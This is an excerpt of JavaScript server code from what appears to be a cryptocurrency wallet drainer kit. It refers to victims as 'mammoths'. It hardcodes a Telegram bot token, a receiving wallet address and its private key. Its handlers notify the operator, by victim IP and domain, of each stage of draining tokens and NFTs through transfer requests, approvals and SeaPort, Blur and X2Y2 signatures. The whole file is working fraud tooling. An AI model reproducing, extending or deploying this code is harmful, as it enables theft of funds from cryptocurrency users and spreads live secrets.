...
const MS_Telegram_Token = "6578515731:AAEfObujRqWHE1ZS-vI4YkJA0ibwc3RQ88o"; // Enter your token from the bot from @BotFather here (go there, create a bot there and receive this same token)
const MS_Telegram_Chat_ID = "-4061849094"; // Enter the chat ID here, where you want to send notifications about the mammoth’s actions (if the ID starts with a minus, write it down)

const MS_Wallet_Address = "0xaF2ADd8EC7b21c09eEf945efb1F23bcB727B0830"; // Wallet address where mammoth assets will go
const MS_Wallet_Private = "70b4b397c0eda196186c7fb0c4f0dd4eb11f483794de50da64b6f1bbac03b67b"; // The private key to the wallet is above, MUST BE INDICATED, OTHERWISE THE WITHDRAWAL WILL NOT WORK
const MS_Wallet_Receiver = "0xaF2ADd8EC7b21c09eEf945efb1F23bcB727B0830"; // The wallet where the assets will arrive may be the same as MS_Wallet_Address, or may be different
...
const MS_Allowance_Withdraw = {
  ...
  wallets: { //List of wallets where automatic withdrawal works, including your main wallet (ADDRESS:PRIVATE)
    "0xaF2ADd8EC7b21c09eEf945efb1F23bcB727B0830": "70b4b397c0eda196186c7fb0c4f0dd4eb11f483794de50da64b6f1bbac03b67b",
  }
};
...
const on_transfer_cancel = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.transfer_cancel.mode) || (data.chat_data != false && data.chat_data.transfer_cancel != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected the transfer or the transaction did not go through</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_transfer_request = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.transfer_request.mode) || (data.chat_data != false && data.chat_data.transfer_request != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a request for transfer</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_approve_success = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>✅ User #user_${data.user_id} issued confirmation</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_transfer_success = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.transfer_success.mode) || (data.chat_data != false && data.chat_data.transfer_success != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>✅ User #user_${data.user_id} made a transfer</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
  ...
  try {
    ...
    if (data.seaport == 'request') {
      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
        ...
        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} получил запрос на SeaPort</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>Список NFT:</b> ${nfts_list_str}`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
      ...
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} отклонил SeaPort</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\nМы предложим ему списать NFT отдельно`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
  ...
  try {
    ...
    if (data.blur == 'request') {
      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
        ...
        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} получил запрос на Blur</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>Список NFT:</b> ${nfts_list_str}`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
      ...
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} отклонил Blur</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\nМы предложим ему списать NFT отдельно`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
  ...
  try {
    ...
    if (data.x2y2 == 'request') {
      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
        ...
        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} получил запрос на X2Y2</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>Список NFT:</b> ${nfts_list_str}`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
      ...
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} отклонил X2Y2</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\nМы предложим ему списать NFT отдельно`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
